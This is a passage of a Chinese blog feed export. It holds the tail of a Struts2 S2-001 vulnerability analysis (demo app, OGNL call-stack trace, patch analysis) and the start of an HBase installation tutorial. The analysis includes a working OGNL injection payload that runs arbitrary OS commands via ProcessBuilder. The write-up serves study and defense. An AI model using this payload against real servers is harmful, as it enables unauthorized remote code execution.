class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Sign On<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">s:form</span> <span class="attr">action</span>=<span class="string">"Login"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"username"</span> <span class="attr">name</span>=<span class="string">"username"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">s:submit</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">s:form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后新建<code>welcome.jsp</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>S2-001<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">s:property</span> <span class="attr">value</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">s:property</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>在<code>src</code>下新建<code>com.demo.action</code>package<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login</span> <span class="title">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String password = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String getUsername() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String getPassword() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> void setUsername(String username) &#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> void setPassword(String password) &#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String execute() &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">                &amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>修改<code>struts.xml</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"s2"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"Login"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.Login"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>之后即可运行程序出现登陆Demo<br><img src="https://i.loli.net/2019/04/13/5cb1a96ed125a.png" alt></p><h2 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h2><p>在分析之前还是看一下十多年前官方的描述<br><img src="https://s2.ax1x.com/2019/04/12/AqalV0.png" alt="AqalV0.png"><br>看到问题是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用<br>OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。<br>第一次分析JAVA代码，还是觉得无从下断分析，但是既然是OGNL表达式导致的问题，那么表达式必然会经过OGNL解析并返回结果，前辈们给出的分析思路便是在OGNL表达式原生API <code>getValue</code>处下断点，该方法用于解析OGNL表达式并返回表达式的值。<br><img src="https://i.loli.net/2019/04/13/5cb147fc19bfc.png" alt><br>下断后便可发送payload<code>%{1+1}</code>，直到在断点处出现我们的payload,此时在调用栈中即可看到漏洞发生的整个过程。<br><img src="https://i.loli.net/2019/04/12/5cb00c397a2ee.png" alt><br>然后便可以根据调用栈开始分析过程。<br>首先我们的payload是从<code>index.jsp</code>输入的，这里需要了解的是jsp的本质也是一个Servlet，在执行jsp的时候tomcat会将其转化为java代码，比如这里<code>index.jsp</code>被转化为<code>index_jsp.java</code>。<br><img src="https://i.loli.net/2019/04/13/5cb157f27980b.png" alt><br>之后struts便会调用<code>ComponentTagSupport</code>类中<code>doStartTag</code> <code>doEndTag</code>方法对<code>index_JSP.hava</code>中的struts标签进行处理。<br><img src="https://i.loli.net/2019/04/13/5cb1583bbf7c7.png" alt><br>上图可以看出，调用<code>doEndTag</code>方法对标签时会调用<code>this.component.end()</code>方法。<br>跟进之后在<code>UIBean</code>类中<code>end</code>方法中会继续调用同类下的<code>evaluateParams</code><br><img src="https://i.loli.net/2019/04/13/5cb159a769188.png" alt><br>跟进<code>evaluateParams</code>，该方法会对标签属性取得name之后判断是否开启<code>altSyntax</code>功能，开启则会用<code>%{}</code>将标签属性值名称包裹，用于使用OGNL表达式对其处理。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">altSyntax</span> 功能是 <span class="keyword">Struts </span><span class="number">2</span> 框架用于处理标签内容的一种新语法（不同于普通的 HTML ），该功能主要作用在于支持对标签中的 OGNL 表达式进行解析并执行。该功能在<span class="keyword">struts2核心配置文件struts.properties中默认开启。</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/13/5cb15a1922f79.png" alt><br>然后username经过上面处理之后，进入到该类下的<code>getValue</code>方法查询表达式的值，继续跟进。<br><img src="https://i.loli.net/2019/04/13/5cb15dcf9e97c.png" alt><br>在该方法中调用<code>TextParseUtil.translateVariables</code>。<br><img src="https://i.loli.net/2019/04/13/5cb15e428937d.png" alt><br>之后调用了该类下的同名方法<code>translateVariables</code>，对OGNL表达式进行了递归处理，从而使得我们的payload可以在递归处理时被OGNL表达式执行。<br>继续查看该方法，便可以看到使用了<code>while(true)</code>对表达式进行了递归处理。<br><img src="https://i.loli.net/2019/04/13/5cb15f12d6784.png" alt><br>之后便对表达式去掉<code>%{}</code>调用<code>stack.findValue</code>即<code>OgnlValueStack</code>类下的<code>findValue</code>，并最终调用了Ognl的<code>getValue</code>方法对表达式进行取值<br><img src="https://i.loli.net/2019/04/13/5cb15fe7d316b.png" alt><br>在<code>getValue</code>中可以看到取到了我们的payload<br><img src="https://i.loli.net/2019/04/13/5cb160217abad.png" alt><br>之后取得的值复制给<code>o</code>并最终复制给<code>expression</code>，继续在while循环中被处理。<br><img src="https://i.loli.net/2019/04/13/5cb161298df9b.png" alt><br>最终在OGNL表达式中被处理，获得计算结果<code>2</code>。<br><img src="https://i.loli.net/2019/04/13/5cb161c75292f.png" alt></p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>POC<br><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="symbol">#a</span>=(new java.lang.<span class="type">ProcessBuilder</span>(new java.lang.<span class="type">String</span>[]&#123;<span class="comment">"whoami"</span>&#125;)).redirectErrorStream(<span class="keyword">true</span>).start(),<span class="symbol">#b</span>=<span class="symbol">#a</span>.getInputStream(),<span class="symbol">#c</span>=new java.io.<span class="type">InputStreamReader</span>(<span class="symbol">#b</span>),<span class="symbol">#d</span>=new java.io.<span class="type">BufferedReader</span>(<span class="symbol">#c</span>),<span class="symbol">#e</span>=new char[<span class="number">50000</span>],<span class="symbol">#d</span>.read(<span class="symbol">#e</span>),<span class="symbol">#f</span>=<span class="symbol">#context</span>.get(<span class="comment">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>),<span class="symbol">#f</span>.getWriter().println(new java.lang.<span class="type">String</span>(<span class="symbol">#e</span>)),<span class="symbol">#f</span>.getWriter().flush(),<span class="symbol">#f</span>.getWriter().close()&#125;</span><br></pre></td></tr></table></figure></p><p>修改<code>new java.lang.String[]{&quot;whoami&quot;}</code>即可执行任意命令</p><p>如需参数可这样利用<code>new java.lang.String[]{&quot;net&quot;,&quot;user&quot;}</code></p><h2 id="0x04-补丁分析"><a href="#0x04-补丁分析" class="headerlink" title="0x04 补丁分析"></a>0x04 补丁分析</h2><p>在<code>XWork2.0.4</code>增加了loopCount判断以取消对OGNL的递归解析<br><img src="https://i.loli.net/2019/04/13/5cb1b1bce7cb1.png" alt></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05  参考"></a>0x05  参考</h2><p><a href="http://d1iv3.me/2018/02/01/S2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">S2-001漏洞分析</a><br><a href="https://wystatic.tuisec.win/static/drops/papers-340.html" target="_blank" rel="noopener">OGNL设计及使用不当造成的远程代码执行漏洞</a><br><a href="https://www.sqyysec.com/Struts-001%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">Struts-001远程代码执行漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;入门JAVA代码审计的第一篇文章，还是决定以漏洞之王&lt;code&gt;struts2&lt;/code&gt;下手，本
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="https://zhengbao.wang/tags/java/"/>
    
      <category term="struts2" scheme="https://zhengbao.wang/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>Hadoop之Hbase架构环境搭建及使用JAVA API远程连接</title>
    <link href="https://zhengbao.wang/Hadoop%E4%B9%8BHbase%E6%9E%B6%E6%9E%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8JAVA%20API%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/"/>
    <id>https://zhengbao.wang/Hadoop之Hbase架构环境搭建及使用JAVA API远程连接/</id>
    <published>2019-04-10T03:38:19.000Z</published>
    <updated>2019-04-16T12:50:16.564Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Hbase全称为Hadoop Database，是一个分布式的存储系统。Hbase使用Hadoop的HDFS作为其文件存储系统，使用Hadoop的MapReduce来处理Hbase中的海量数据，使用zookeeper作为其协调工具。</p><p>查看本教程之前，请确保已安装配置好Hadoop，可参考<a href="https://zhengbao.wang/Centos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/">Centos7搭建Hadoop伪分布式集群详细步骤</a>,<a href="https://zhengbao.wang/%E4%BD%BF%E7%94%A8Hadoop-JAVA-API-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5HDFS/">使用Hadoop JAVA API 远程连接HDFS</a></p><h2 id="0x01-下载安装"><a href="#0x01-下载安装" class="headerlink" title="0x01 下载安装"></a>0x01 下载安装</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>首先在<a href="https://hbase.apache.org/downloads.html" target="_blank" rel="noopener">官网下载Hbase</a><br><img src="https://i.loli.net/2019/04/10/5cad52022e1ed.png" alt><br>选择对应版本的bin文件，国内根据推荐的清华源下载即可。<br><img src="https://i.loli.net/2019/04/10/5cad5233119c1.png" alt><br>linux下可使用<code>wget</code>命令下载，我下载的为<code>2.1.4</code>版本<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/apache/</span>hbase<span class="regexp">/2.1.4/</span>hbase-<span class="number">2.1</span>.<span class="number">4</span>-bin.tar.gz</span><br></pre></td></tr></table></figure></p><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><p>下载后即可解压到目录,我这里直接在当前目录解压<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">tar</span> <span class="selector-tag">-zxvf</span> <span class="selector-tag">hbase-2</span><span class="selector-class">.1</span><span class="selector-class">.4-bin</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/10/5cad5357a9309.png" alt></p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>进入解压后的目录使用<code>pwd</code>命令查看路径<br><img src="https://i.loli.net/2019/04/10/5cad53b262f1e.png" alt><br>然后修改<code>.bashrc</code>配置环境变量</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.bashrc</span><br><span class="line">在最后添加</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">HBASE_HOME</span>=/home/wzb/hbase-2.1.4</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="variable">$PATH</span>:$HBASE_HOME/bin</span><br><span class="line">保存后退出</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/10/5cad54b3853b2.png" alt><br>然后使用<code>source ~/.bashrc</code>命令使配置生效<br>然后输入命令<code>hbase</code>可看到环境变量配置成功<br><img src="https://i.loli.net/2019/04/10/5cad5563ddb7e.png" alt></p><h2 id="0x02-启动Hbase"><a href="#0x02-启动Hbase" class="headerlink" title="0x02 启动Hbase"></a>0x02 启动Hbase</h2><p>在启动hbase之前。首先进行相应的配置修改</p><h3 id="配置hbase-env-sh"><a href="#配置hbase-env-sh" class="headerlink" title="配置hbase-env.sh"></a>配置hbase-env.sh</h3><p>修改hbase所在目录下的<code>conf</code>目录的<code>hbase-env.sh</code><br>如我的位置为<code>/home/wzb/hbase-2.1.4/conf/hbase-env.sh</code><br>首先配置环境变量<code>export JAVA_HOME=/usr/local/java/jdk1.8.0_201</code>,此处修改为你的java环境变量，如不知道，可通过<code>echo $JAVA_HOME</code>查看<br>然后配置<code>export HBASE_MANAGES_ZK=true</code>,使用其自带的<code>zookeeper</code><br><img src="https://i.loli.net/2019/04/10/5cad583900c70.png" alt></p><h3 id="配置hbase-site-xml"><a href="#配置hbase-site-xml" class="headerlink" title="配置hbase-site.xml"></a>配置hbase-site.xml</h3><p>然后继续配置<code>conf</code>目录下的<code>hbase-site.xml</code><br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;configuration&gt;</span></span><br><span class="line"><span class="params">&lt;property&gt;</span></span><br><span class="line">                <span class="params">&lt;name&gt;</span>hbase.rootdir<span class="params">&lt;/name&gt;</span></span><br><span class="line">                <span class="params">&lt;value&gt;</span>hdfs:<span class="comment">//192.168.111.147:9000/hbase&lt;/value&gt;</span></span><br><span class="line"><span class="params">&lt;/property&gt;</span></span><br><span class="line"><span class="params">&lt;property&gt;</span></span><br><span class="line"><span class="params">&lt;name&gt;</span>hbase.zookeeper.quorum<span class="params">&lt;/name&gt;</span>  </span><br><span class="line"><span class="params">&lt;value&gt;</span><span class="number">192.168</span><span class="number">.111</span><span class="number">.147</span><span class="params">&lt;/value&gt;</span>  </span><br><span class="line"><span class="params">&lt;/property&gt;</span></span><br><span class="line">        <span class="params">&lt;property&gt;</span></span><br><span class="line"><span class="params">&lt;name&gt;</span>hbase.cluster.distributed<span class="params">&lt;/name&gt;</span></span><br><span class="line"><span class="params">&lt;value&gt;</span>true<span class="params">&lt;/value&gt;</span></span><br><span class="line"><span class="params">&lt;/property&gt;</span></span><br><span class="line"><span class="params">&lt;property&gt;</span></span><br><span class="line">                <span class="params">&lt;name&gt;</span>hbase.zookeeper.property.dataDir<span class="params">&lt;/name&gt;</span></span><br><span class="line">                <span class="params">&lt;value&gt;</span><span class="meta-keyword">/home/</span>wzb/Hbase<span class="meta-keyword">/zookeeper/</span>tmp<span class="params">&lt;/value&gt;</span></span><br><span class="line">        <span class="params">&lt;/property&gt;</span></span><br><span class="line"><span class="params">&lt;property&gt;</span></span><br><span class="line"> <span class="params">&lt;name&gt;</span>hbase.unsafe.stream.capability.enforce<span class="params">&lt;/name&gt;</span></span><br><span class="line"> <span class="params">&lt;value&gt;</span>false<span class="params">&lt;/value&gt;</span></span><br><span class="line"><span class="params">&lt;/property&gt;</span></span><br><span class="line"><span class="params">&lt;property&gt;</span></span><br><span class="line"><span class="params">&lt;name&gt;</span>hbase.wal.provider<span class="params">&lt;/name&gt;</span></span><br><span class="line"><span class="params">&lt;value&gt;</span>filesystem<span class="params">&lt;/value&gt;</span></span><br><span class="line"><span class="params">&lt;/property&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="params">&lt;/configuration&gt;</span></span><br></pre></td></tr></table></figure></p><p>注意标识处根据自己环境修改<br><img src="https://i.loli.net/2019/04/10/5cad58dbebb50.png" alt></p><h3 id="下载htrace-core-3-1-0-incubating-jar"><a href="#下载htrace-core-3-1-0-incubating-jar" class="headerlink" title="下载htrace-core-3.1.0-incubating.jar"></a>下载htrace-core-3.1.0-incubating.jar</h3><p>下载<a href="https://jar-download.com/artifacts/org.apache.htrace/htrace-core/3.1.0-incubating/source-code" target="_blank" rel="noopener">htrace-core-3.1.0-incubating.jar</a>并移至hbase安装目录下的<code>lib</code>文件夹</p><h3 id="启动start-hbase-sh"><a href="#启动start-hbase-sh" class="headerlink" title="启动start-hbase.sh"></a>启动<code>start-hbase.sh</code></h3><p>配置修改好后即可通过<code>start-hbase.sh</code>命令启动<br>在启动之前，请先使用<code>start-all.sh</code>启动hadoop相关进程<br><img src="https://i.loli.net/2019/04/10/5cad59b844412.png" alt><br>然后即可使用命令<code>start-hbase.sh</code>启动hbase<br><img src="https://i.loli.net/2019/04/10/5cad5a028b379.png" alt><br>通过<code>jps</code>可看到比刚才多出来<code>HMaster</code> <code>HRegionServer</code> <code>HQuorumPeer</code>三个进程，如后面出现错误可看查这些进程是否正常启动，如未启动移步文章末尾问题解决可查笔者记录的解决办法。</p><h3 id="访问apache-Hbase"><a href="#访问apache-Hbase" class="headerlink" title="访问apache Hbase"></a>访问apache Hbase</h3><p>此处正常启动后继续<br>然后通过浏览器访问<code>http://192.168.111.147:16010/master-status</code><br>此处ip即为你在<code>hbase-site.xml</code>文件中配置的ip<br><img src="https://i.loli.net/2019/04/10/5cad5b4b6c9dd.png" alt><br>至此Hbase启动成功。</p><h2 id="0x03-Hbase-shell"><a href="#0x03-Hbase-shell" class="headerlink" title="0x03 Hbase shell"></a>0x03 Hbase shell</h2><p>hbase提供了一个shell的终端给用户交互。使用命令<code>hbase shell</code>进入命令界面。通过执行 help可以看到命令的帮助信息。<br><img src="https://i.loli.net/2019/04/10/5cadd10ebdb15.png" alt><br>下图列出常用命令<br><img src="https://i.loli.net/2019/04/10/5cadd0c240b73.png" alt><br>更过命令操作可参考<a href="http://www.ityouknow.com/hbase/2017/07/28/hbase-shell.html" target="_blank" rel="noopener">HBase shell 命令介绍</a></p><h2 id="0x04-Java-API连接Hbase"><a href="#0x04-Java-API连接Hbase" class="headerlink" title="0x04 Java API连接Hbase"></a>0x04 Java API连接Hbase</h2><h3 id="修改hosts"><a href="#修改hosts" class="headerlink" title="修改hosts"></a>修改hosts</h3><p>因为Hbase 16000端口绑定为127.0.0.1,所以通过其他主机无法访问，这里唯一的解决方法是修改hosts文件<br>修改linux hostname<br><code>sudo vi /etc/sysconfig/network</code><br>添加以下内容<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">NETWORKING</span>=<span class="literal">yes</span></span><br><span class="line"><span class="attr">HOSTNAME</span>=master</span><br></pre></td></tr></table></figure></p><p>修改linux hosts<br><code>su vi /etc/hosts</code><br>添加以下内容</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">111.147</span> <span class="keyword">master</span> <span class="title">#此处ip</span>添加你的linux ip,hostname填写上面修改的,我这里设置为<span class="literal">master</span>。</span><br></pre></td></tr></table></figure><p>linux配置完成后需重启系统，以使配置生效。</p><p>修改windows hosts文件<br>路径为：<code>C:\Windows\System32\drivers\etc\hosts</code><br>该文件无权限直接修改，需复制出修改完再覆盖掉<br>最后添加一行<code>192.168.111.147 master</code>，同样此处应与上面相同。<br>配置完成后即可继续下面使用java api连接，不配置可能会导致无法连接。</p><h3 id="JAVA-API"><a href="#JAVA-API" class="headerlink" title="JAVA API"></a>JAVA API</h3><p>关于java项目创建参见<a href="https://zhengbao.wang/%E4%BD%BF%E7%94%A8Hadoop-JAVA-API-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5HDFS/">使用Hadoop JAVA API 远程连接HDFS</a><br>在<code>pom.xml</code>中添加<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hbase<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hbase-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>将<code>Hbase-site.xml</code>添加到项目中，如下图<br><img src="https://i.loli.net/2019/04/10/5cadd27c93491.png" alt><br>新建<code>HBase</code>类，内容如下<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package hadoop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.HBaseConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.HColumnDescriptor;</span><br><span 